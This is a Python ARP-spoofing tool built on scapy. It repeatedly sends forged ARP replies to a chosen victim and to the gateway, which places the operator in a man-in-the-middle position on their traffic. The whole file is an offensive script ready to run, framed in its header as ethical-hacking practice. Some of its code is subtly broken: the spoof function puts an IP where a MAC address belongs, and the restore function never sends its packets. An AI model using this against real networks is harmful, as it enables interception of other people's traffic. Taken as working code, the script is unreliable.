#!/usr/bin/env python
"""
Title:    ARP Spoofer
Author:   Aniket Ambore
Date:     June 26, 2021
Comment:  ARP Spoofing - Redirect the flow of Packets

scapy Docs => https://scapy.readthedocs.io/en/latest/introduction.html
Through scapy module we can create different network tools like ARP Spoofer, Network Scanner, packet dumpers etc. This module can be used to create more advanced tools related to network security and ethical hacking.

argparse Docs => https://docs.python.org/3/library/argparse.html#module-argparse
"""

import scapy.all as scapy
import time
import argparse
import sys

FAIL = '\033[91m'
OKGREEN = '\033[92m'
OKCYAN = '\033[96m'
ORANGE = '\033[93m'


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP of Victim")
    parser.add_argument("-s", "--spoof", dest="spoof_ip", help="Spoof/Gateway/Router IP")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error(FAIL + "[-] Please specify a victim IP, use --help for more info.")
    elif not options.spoof_ip:
        parser.error(FAIL + "[-] Please specify a spoof IP, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# op --> ShortEnumField --> 1 (This means by-default it is ARP request)
# pdst --> IPField --> IP of the Target Computer (Windows Computer).
# hwdst --> MACField --> MAC Address of the Target Computer (Windows Computer).
# psrc --> SourceField --> Setting it to the IP of the Router.

# Sending a packet to the victim(windows computer), saying we've the Router MAC address.
# packet = scapy.ARP(op=2,pdst="10.0.2.3",hwdst="08:00:27:50:35:3b",psrc="10.0.2.1")
# print(packet.summary())
# print(packet.show())

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Scapy automatically puts source mac address to our(kali) mac address.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_ip, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # If we doesn't specify the hwsrc parameter, scapy will automatically set it to our(kali) mac address.
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0. / 100)


def script_header():
    slowprint('''\033[1;31m \033[92m
╔═╗╦═╗╔═╗  ╔═╗┌─┐┌─┐┌─┐┌─┐┬┌┐┌┌─┐
╠═╣╠╦╝╠═╝  ╚═╗├─┘│ ││ │├┤ │││││ ┬
╩ ╩╩╚═╩    ╚═╝┴  └─┘└─┘└  ┴┘└┘└─┘
    ''')


def description_print(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(3. / 100)


options = get_arguments()
script_header()
description_print("\033[95m-> ARP Spoofing - Redirect the flow of Packets\033[97m")

target_ip = options.target_ip  # Windows Machine
gateway_ip = options.spoof_ip  # Router

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # Dynamic Printing
        # Python2
        # print("\r[+] Packets sent " + str(sent_packets_count)),
        # sys.stdout.flush()
        # Python3
        print(ORANGE + "\r[+]" + OKCYAN + " Packets sent " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print(ORANGE + "\n[!]" + FAIL + " Caught Keyboard Interrupt Exception... Resetting ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
